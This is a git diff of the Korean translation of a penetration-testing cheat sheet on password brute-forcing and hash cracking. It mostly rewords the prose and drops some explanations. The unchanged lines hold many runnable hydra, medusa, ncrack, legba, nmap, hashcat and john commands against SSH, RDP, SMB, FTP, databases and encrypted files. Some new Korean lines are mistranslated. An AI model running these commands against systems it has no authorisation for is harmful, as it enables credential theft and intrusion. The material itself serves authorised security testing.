@@ -1,9 +1,9 @@
 # 브루트 포스 - 치트 시트
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축** 및 **자동화**하세요.\
 오늘 바로 액세스하세요:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -14,11 +14,11 @@
 
 HackTricks를 지원하는 다른 방법:
 
-* **회사가 HackTricks에 광고되길 원하거나** **PDF로 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요
+* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **해킹 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를 팔로우**하세요.
+* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
 
 </details>
 
@@ -37,9 +37,9 @@ HackTricks를 지원하는 다른 방법:
 * [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
 * [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
 * [**https://many-passwords.github.io/**](https://many-passwords.github.io)
-* [**https://theinfocentric.com/**](https://theinfocentric.com/) 
+* [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **사용자 정의 사전 만들기**
+## **자체 사전 만들기**
 
 대상에 대한 정보를 최대한 찾아서 사용자 정의 사전을 생성하세요. 도움이 될 수 있는 도구:
 
@@ -55,8 +55,6 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 crunch 6 8 -t ,@@^^%%
 ```
 ### Cewl
-
-Cewl은 웹 사이트에서 단어 목록을 생성하는 데 사용되는 도구입니다. 일반적으로 웹 사이트의 텍스트를 스크랩하고 공격자가 나중에 암호 크래킹 또는 사전 공격에 사용할 수 있는 단어 목록을 만들기 위해 사용됩니다.
 ```bash
 cewl example.com -m 5 -w words.txt
 ```
@@ -68,7 +66,7 @@ python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-특정 대상과 관련된 사용하기 적합한 고유한 워드리스트를 생성할 수 있도록 주어진 단어들로 여러 가지 변형을 만들어주는 워드리스트 생성 도구입니다.
+특정 대상과 관련된 사용하기 적합한 고유하고 이상적인 단어 목록을 생성할 수 있도록 주어진 단어들로 여러 가지 변형을 만들 수 있게 해주는 단어 목록 생성 도구입니다.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -89,7 +87,7 @@ Finished in 0.920s.
 ```
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### 워드리스트
+### 단어 목록
 
 * [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 * [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -102,7 +100,7 @@ Finished in 0.920s.
 * [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 * [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축** 및 **자동화**하세요.\
@@ -112,7 +110,7 @@ Finished in 0.920s.
 
 ## 서비스
 
-서비스 이름을 알파벳 순으로 정렬했습니다.
+서비스 이름별 알파벳순으로 정렬됨.
 
 ### AFP
 ```bash
@@ -126,7 +124,7 @@ msf> run
 ```
 ### AJP
 
-AJP (Apache JServ Protocol) is a binary protocol that can be used to communicate with a web server. It is often used to connect web servers with servlet containers, such as Apache Tomcat. A common attack vector against AJP is credential brute-forcing, where an attacker tries to guess usernames and passwords to gain unauthorized access to the server. It is important to use strong and unique credentials to prevent successful brute-force attacks.
+AJP(Apache JServ Protocol)는 Apache Tomcat 서버와의 통신을 위한 프로토콜입니다.
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
@@ -142,7 +140,7 @@ legba scylla --username cassandra --password wordlists/passwords.txt --target lo
 ```
 ### CouchDB
 
-### CouchDB
+CouchDB는 HTTP 기반의 RESTful API를 제공하므로 브루트 포스 공격을 수행하기 위해 매우 적합합니다. 일반적으로 관리자 계정 또는 사용자 계정에 대한 브루트 포스 공격을 시도할 수 있습니다.
 ```bash
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
@@ -152,14 +150,12 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordl
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
 ### Elasticsearch
-
-### 엘라스틱서치
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
 ```
 ### FTP
 
-FTP는 파일 전송 프로토콜을 나타냅니다. 호스트에 대한 액세스를 얻기 위해 무차별 대입 공격을 수행할 때 사용할 수 있습니다. 일반적으로 사용자 이름과 비밀번호를 대입하여 시도하며, 성공할 경우 파일 시스템에 액세스할 수 있습니다.
+FTP는 파일 전송 프로토콜(File Transfer Protocol)의 약자로, 네트워크를 통해 파일을 전송하기 위해 사용됩니다. FTP 서버에 무차별 대입(brute force) 공격을 시도하여 암호를 추측하는 것은 일반적인 해킹 기술 중 하나입니다.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ftp
 ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
@@ -194,7 +190,7 @@ cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 ```
 ### IMAP
 
-IMAP은 전자 메일을 관리하기 위한 프로토콜입니다. IMAP 브루트 포스는 사용자의 이메일 계정에 대한 암호를 찾기 위해 다양한 암호를 시도하는 공격 기술입니다. 이를 통해 해커는 암호를 추측하여 액세스할 수 있습니다.
+IMAP은 전자 메일을 관리하기 위한 프로토콜입니다. 일반적으로 IMAP 서버에 대한 무차별 대입 공격은 사용자의 이메일 계정에 액세스하기 위해 시도됩니다.
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
@@ -203,19 +199,15 @@ legba imap --username user --password data/passwords.txt --target localhost:993
 ```
 ### IRC
 
-IRC (Internet Relay Chat)는 인터넷 상에서 실시간으로 대화를 나누는 데 사용되는 프로토콜입니다. 대부분의 IRC 서버는 비밀번호를 요구하지 않기 때문에 브루트 포스 공격에 취약할 수 있습니다. 가능한 모든 비밀번호를 시도하여 액세스를 얻으려고 시도하는 것이 일반적입니다.
+IRC는 Internet Relay Chat의 약자로, 실시간으로 사용자들이 채팅할 수 있는 프로토콜입니다. 사용자는 채널에 참여하여 텍스트 메시지를 주고받을 수 있습니다.
 ```bash
 nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
 ```
-### ISCSI
-
 ### ISCSI
 ```bash
 nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
 ```
 ### JWT
-
-JWT는 JSON Web Token의 약자로, 웹 토큰을 나타냅니다. 이는 클라이언트와 서버 간에 정보를 안전하게 전달하기 위한 표준 방법 중 하나입니다. JWT는 페이로드에 대한 서명을 포함하고 있어 변조를 방지할 수 있습니다.
 ```bash
 #hashcat
 hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
@@ -240,13 +232,11 @@ jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibm
 ```
 ### LDAP
 
-LDAP은 Lightweight Directory Access Protocol의 약자로, 네트워크 디렉터리 서비스를 사용하기 위한 프로토콜입니다. LDAP 서버에 대한 브루트 포스 공격은 일반적으로 사용자 자격 증명을 추측하기 위해 많은 시도를 하는 것을 의미합니다. LDAP 브루트 포스는 흔히 사용자 이름과 비밀번호를 찾기 위해 사용됩니다.
+LDAP(Lightweight Directory Access Protocol)은 네트워크 프로토콜로, 디렉터리 서비스에 접근하기 위해 사용됩니다. LDAP 브루트 포스는 사용자 이름과 비밀번호를 추측하여 시스템에 액세스를 시도하는 공격 기법 중 하나입니다.
 ```bash
 nmap --script ldap-brute -p 389 <IP>
 legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
 ```
-### MQTT
-
 ### MQTT
 ```
 ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
@@ -260,7 +250,7 @@ legba mongodb --target localhost:27017 --username root --password data/passwords
 ```
 ### MSSQL
 
-### MSSQL
+MSSQL은 Microsoft SQL Server의 약자로, Windows 환경에서 가장 널리 사용되는 관계형 데이터베이스 관리 시스템(RDBMS)입니다.
 ```bash
 legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
 ```
@@ -281,16 +271,6 @@ medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on fir
 legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
 ```
 ### OracleSQL
-
-오라클 데이터베이스에 대한 무차별 대입 공격은 일반적으로 다음과 같은 방법으로 수행됩니다.
-
-1. **사전 공격**: 가장 일반적인 방법으로, 미리 정의된 단어 목록(사전)을 사용하여 비밀번호를 대입합니다.
-2. **숫자 대입**: 모든 가능한 숫자 조합을 시도하여 비밀번호를 찾습니다.
-3. **알파벳 대입**: 모든 가능한 알파벳 조합을 시도하여 비밀번호를 찾습니다.
-4. **기호 대입**: 특수 문자 및 기호를 사용하여 비밀번호를 찾습니다.
-5. **하이브리드 대입**: 알파벳, 숫자, 기호를 혼합하여 대입합니다.
-
-이러한 방법 중 하나 또는 여러 가지를 조합하여 공격자는 오라클 데이터베이스에 대한 액세스를 시도할 수 있습니다.
 ```bash
 patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
 
@@ -336,8 +316,6 @@ legba pop3 --username admin@example.com --password wordlists/passwords.txt --tar
 legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
 ```
 ### PostgreSQL
-
-포스트그레SQL(PostgreSQL)은 오픈 소스 객체-관계형 데이터베이스 시스템입니다.
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
 medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
@@ -349,22 +327,18 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 ```
 ### PPTP
 
-`.deb` 패키지를 설치하기 위해 [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)에서 다운로드할 수 있습니다.
+[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)에서 `.deb` 패키지를 다운로드하여 설치할 수 있습니다.
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
 ```
 ### RDP
-
-원격 데스크톱 프로토콜(Remote Desktop Protocol)은 Microsoft Windows 운영 체제에서 원격 데스크톱 서비스를 제공하는 데 사용되는 프로토콜입니다. RDP 브루트 포스 공격은 암호를 추측하여 RDP 서버에 대한 액세스를 시도하는 공격 기술입니다.
 ```bash
 ncrack -vv --user <User> -P pwds.txt rdp://<IP>
 hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
 legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
 ```
 ### Redis
-
-### 레디스
 ```bash
 msf> use auxiliary/scanner/redis/redis_login
 nmap --script redis-brute -p 6379 <IP>
@@ -373,21 +347,19 @@ legba redis --target localhost:6379 --username admin --password data/passwords.t
 ```
 ### Rexec
 
-### Rexec
-
-Rexec는 원격 실행 서비스를 사용하여 사용자가 원격 시스템에서 명령을 실행할 수 있도록 하는 프로토콜입니다. Rexec 서비스는 일반적으로 TCP 포트 512에서 실행됩니다. Brute force 공격은 Rexec 서비스에 대한 암호를 찾기 위해 사용될 수 있습니다.
+Rexec는 원격 실행 서비스에 대한 브루트 포스 공격을 수행하는 데 사용됩니다.
 ```bash
 hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
 ```
 ### Rlogin
 
-Rlogin은 원격 로그인 프로토콜로, 사용자 이름과 비밀번호를 사용하여 원격 시스템에 로그인하는 데 사용됩니다. Brute force 공격은 일반적으로 사전 목록에서 사용자 이름과 비밀번호를 반복적으로 시도하여 액세스를 시도하는 방법으로 Rlogin 계정을 공격하는 데 사용될 수 있습니다.
+Rlogin은 원격 로그인 프로토콜입니다. 호스트 이름, 사용자 이름 및 비밀번호를 사용하여 원격 시스템에 로그인하는 데 사용됩니다. Brute force 공격은 가능한 모든 비밀번호 조합을 시도하여 액세스를 시도하는 공격 기술 중 하나입니다.
 ```bash
 hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```
 ### Rsh
 
-Rsh (Remote Shell) is a simple remote shell client included in Unix operating systems. It can be used to execute commands on a remote system. Rsh is often targeted during brute-force attacks due to its weak authentication mechanism.
+Rsh는 원격 셸 서비스에 대한 브루트 포스 공격을 수행하는 데 사용될 수 있습니다.
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
@@ -398,8 +370,6 @@ hydra -L <Username_list> rsh://<Victim_IP> -v -V
 nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
 ```
 ### RTSP
-
-RTSP (Real Time Streaming Protocol)는 네트워크를 통해 미디어를 전송하기 위한 제어 프로토콜입니다. RTSP는 미디어 스트리밍 서버와 클라이언트 간의 통신을 관리하며, 미디어 스트리밍을 제어하고 동기화하는 데 사용됩니다. RTSP는 TCP를 사용하며, 일반적으로 554번 포트를 통해 통신합니다.
 ```bash
 hydra -l root -P passwords.txt <IP> rtsp
 ```
@@ -411,7 +381,7 @@ legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --tar
 ```
 ### SNMP
 
-SNMP(Simple Network Management Protocol)은 네트워크 장비 및 서버에서 정보를 수집하는 데 사용되는 프로토콜입니다. SNMP 커뮤니티스트링을 브루트 포스 공격하여 SNMP 장비에 액세스할 수 있습니다.
+SNMP(Simple Network Management Protocol)은 네트워크 장비 및 서버에서 정보를 수집하기 위해 사용되는 프로토콜입니다. SNMP 브루트 포스는 SNMP 커뮤니티 문자열을 추측하여 시스템에 액세스하려는 시도를 의미합니다. SNMP 브루트 포스는 일반적으로 사전 정의된 커뮤니티 문자열 목록을 사용하여 수행됩니다.
 ```bash
 msf> use auxiliary/scanner/snmp/snmp_login
 nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
@@ -420,7 +390,7 @@ hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt ta
 ```
 ### SMB
 
-SMB은 Windows 운영 체제에서 파일 및 프린터 공유를 위한 프로토콜입니다. SMB 버전 1은 보안 취약점으로 악용될 수 있으므로, 브루트 포스 공격을 통해 사용자 자격 증명을 얻을 수 있습니다.
+### SMB
 ```bash
 nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
@@ -428,7 +398,7 @@ legba smb --target share.company.com --username admin --password data/passwords.
 ```
 ### SMTP
 
-SMTP(Simple Mail Transfer Protocol)는 전자 메일을 전송하는 데 사용되는 프로토콜입니다. 호스트 간 통신을 위해 TCP 포트 25를 사용합니다. Brute force는 SMTP 서버에 대한 암호를 찾기 위해 일반적으로 사용되는 기술 중 하나입니다.
+SMTP(Simple Mail Transfer Protocol)은 전자 메일을 전송하기 위한 표준 프로토콜입니다.
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
 hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
@@ -445,7 +415,7 @@ legba socks5 --target localhost:1080 --username admin --password data/passwords.
 ```
 ### SQL Server
 
-SQL Server는 Microsoft에서 개발한 관계형 데이터베이스 관리 시스템입니다. SQL Server에 대한 브루트 포스 공격은 사용자 이름과 비밀번호를 찾기 위해 가능한 모든 조합을 시도하는 공격입니다. 이는 보안 취약점을 악용하여 시스템에 무단으로 액세스하려는 공격자들에 의해 시도될 수 있습니다.
+### SQL 서버
 ```bash
 #Use the NetBIOS name of the machine as domain
 crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
@@ -456,7 +426,7 @@ msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts
 ```
 ### SSH
 
-SSH는 Secure Shell의 약자로, 네트워크 프로토콜을 통해 안전하게 통신할 수 있도록 해주는 프로토콜입니다. SSH 브루트 포스는 SSH 서버에 대한 암호를 찾기 위해 모든 가능한 암호를 시도하는 공격 기술입니다. 이는 비밀번호를 추측하여 무단으로 시스템에 액세스하려는 악의적인 공격자에 의해 사용될 수 있습니다. SSH 브루트 포스 공격을 방지하기 위해 강력한 암호 정책을 시행하고, 공격 감지 시스템을 구축하여 이러한 시도를 모니터링하는 것이 중요합니다.
+SSH는 Secure Shell의 약자로, 네트워크 프로토콜을 통해 안전하게 통신할 수 있도록 해주는 프로토콜입니다. SSH 브루트 포스는 SSH 서버에 대한 무차별 대입 공격을 의미하며, 일반적으로 사전에 정의된 암호 목록이나 암호 생성 규칙을 사용하여 암호를 반복적으로 시도하는 공격 방법입니다. 이를 통해 암호를 추측하여 무단으로 시스템에 액세스하려는 공격자를 탐지할 수 있습니다.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ssh
 ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
@@ -468,11 +438,11 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### 약한 SSH 키 / Debian 예측 가능 PRNG
 
-일부 시스템에는 암호화 자료를 생성하는 데 사용된 난수 시드에 알려진 결함이 있습니다. 이는 키 공간이 크게 축소되어 [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)와 같은 도구를 사용하여 무차별 대입할 수 있습니다. 또한 [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)와 같이 약한 키의 사전 생성 세트도 사용할 수 있습니다.
+일부 시스템에는 암호화 자료를 생성하는 데 사용된 난수 시드에 알려진 결함이 있습니다. 이는 [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)와 같은 도구를 사용하여 브루트포스 공격을 수행할 수 있는 키 공간이 현저히 축소될 수 있습니다. 또한 [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)와 같이 약한 키의 사전 생성된 세트도 사용할 수 있습니다.
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ 및 OpenMQ)
 
-STOMP 텍스트 프로토콜은 RabbitMQ, ActiveMQ, HornetQ 및 OpenMQ와 같은 인기있는 메시지 큐 서비스와의 원활한 통신 및 상호 작용을 **허용하는** 널리 사용되는 메시징 프로토콜입니다. 이는 메시지를 교환하고 다양한 메시징 작업을 수행하는 표준화된 효율적인 접근 방식을 제공합니다.
+STOMP 텍스트 프로토콜은 RabbitMQ, ActiveMQ, HornetQ 및 OpenMQ와 같은 인기있는 메시지 큐 서비스와의 원활한 통신과 상호 작용을 허용합니다. 이는 메시지를 교환하고 다양한 메시징 작업을 수행하는 표준화된 효율적인 접근 방식을 제공합니다.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -493,7 +463,7 @@ legba telnet \
 ```
 ### VNC
 
-### VNC
+VNC은 가상 네트워크 컴퓨팅을 위한 프로토콜이다. VNC 서버에 대한 브루트 포스 공격은 일반적으로 사용자명과 암호를 추측하여 접근을 시도하는 것을 의미한다.
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
 medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
@@ -512,7 +482,7 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```bash
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
@@ -525,7 +495,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ### 온라인 해독 데이터베이스
 
 * [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 및 SHA1)
-* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP 및 임의의 challenge 값)
+* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP 및 임의의 도전 값)
 * [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (해시, WPA2 캡처 및 아카이브 MSOffice, ZIP, PDF...)
 * [https://crackstation.net/](https://crackstation.net) (해시)
 * [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
@@ -556,7 +526,8 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### 알려진 평문 zip 공격
 
-암호화된 zip 파일 내부에 포함된 파일의 **평문** (또는 일부 평문)을 알아야 합니다. 암호화된 zip 파일 내부에 포함된 파일의 **파일 이름 및 파일 크기를 확인**하려면 **`7z l encrypted.zip`**을 실행할 수 있습니다. [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)을 릴리스 페이지에서 다운로드하세요.
+암호화된 zip 파일 내부에 포함된 파일의 **평문** (또는 일부 평문)을 알아야 합니다. 암호화된 zip 파일 내부에 포함된 파일의 **파일 이름 및 파일 크기를 확인**하려면 다음을 실행할 수 있습니다: **`7z l encrypted.zip`**\
+릴리스 페이지에서 [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)을 다운로드하세요.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
 zip plaintext.zip plaintext.file
@@ -583,11 +554,7 @@ apt-get install libcompress-raw-lzma-perl
 ```
 ### PDF
 
-PDF (Portable Document Format) is a file format used to present and exchange documents reliably, independent of software, hardware, or operating system. PDF files can contain text, images, hyperlinks, buttons, form fields, videos, and more. PDF files can be password-protected to restrict access to their content. 
-
-### Brute Force Attack
-
-A brute force attack is a trial-and-error method used to obtain information such as a user password or personal identification number (PIN). In a brute force attack, automated software is used to generate a large number of consecutive guesses as to the value of the desired data. This method is effective because many people use weak passwords that can be easily guessed.
+PDF 파일 포맷은 텍스트와 이미지를 효율적으로 저장하는 데 사용되며, 브루트 포스 공격에 취약할 수 있습니다. PDF 파일의 암호를 뚫기 위해 일반적으로 사용되는 도구는 `pdfcrack` 및 `John the Ripper`입니다.
 ```bash
 apt-get install pdfcrack
 pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
@@ -667,17 +634,17 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 ```
 ### Cisco
 
-<figure><img src="../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>
 
 ### DPAPI Master Key
 
-[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)를 사용한 다음 john을 사용합니다.
+DPAPI 마스터 키를 사용하려면 [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)를 사용한 후 john을 사용하십시오.
 
 ### Open Office Pwd Protected Column
 
-만약 비밀번호로 보호된 열이 있는 xlsx 파일이 있다면 다음을 수행할 수 있습니다:
+만약 암호로 보호된 열이 있는 xlsx 파일이 있다면 다음을 수행할 수 있습니다:
 
-* **Google 드라이브에 업로드**하면 비밀번호가 자동으로 제거됩니다.
+* **Google 드라이브에 업로드**하면 암호가 자동으로 제거됩니다.
 * 수동으로 **제거**하려면:
 ```bash
 unzip file.xlsx
@@ -694,10 +661,10 @@ zip -r file.xls .
 # From https://github.com/crackpkcs12/crackpkcs12
 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
 오늘 바로 액세스하세요:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -720,7 +687,7 @@ hash-identifier
 
 ### **워드리스트 생성 도구**
 
-* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 구성 가능한 기본 문자, 키맵 및 경로를 가진 고급 키보드 워크 생성기.
+* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 구성 가능한 기본 문자, 키맵 및 라우트를 가진 고급 키보드 워크 생성기.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
@@ -743,7 +710,7 @@ hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 * **워드리스트 조합** 공격
 
-해시캣을 사용하여 2개의 워드리스트를 **하나로 결합**할 수 있습니다.\
+해시캣을 사용하여 2개의 워드리스트를 **1개로 결합**하는 것이 가능합니다.\
 첫 번째 리스트에는 **"hello"**라는 단어가 포함되어 있고, 두 번째 리스트에는 **"world"**와 **"earth"**라는 단어가 각각 2줄씩 포함되어 있다고 가정했을 때, `helloworld`와 `helloearth` 단어가 생성됩니다.
 ```bash
 # This will combine 2 wordlists
@@ -801,58 +768,39 @@ hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
 # Cracking Linux Hashes - /etc/shadow file
 
-## Introduction
-
-When performing password cracking on Linux systems, the `/etc/shadow` file is a common target. This file stores password hashes for user accounts on the system.
-
-## Methodology
-
-1. **Obtain the `/etc/shadow` file**: Gain access to the target system and retrieve the `/etc/shadow` file. This file is typically only accessible by the root user.
-
-2. **Crack the hashes**: Use tools like John the Ripper or Hashcat to crack the password hashes stored in the `/etc/shadow` file. These tools use various techniques such as brute-force attacks, dictionary attacks, and rule-based attacks to crack the hashes.
-
-3. **Identify weak passwords**: Analyze the cracked passwords to identify weak passwords that could be easily guessed or cracked. This information can be used to improve the overall security of the system by enforcing stronger password policies.
-
-4. **Update passwords**: If weak passwords are identified, prompt users to update their passwords to more secure ones. Educate users on creating strong passwords to prevent future security breaches.
-
-## Conclusion
-
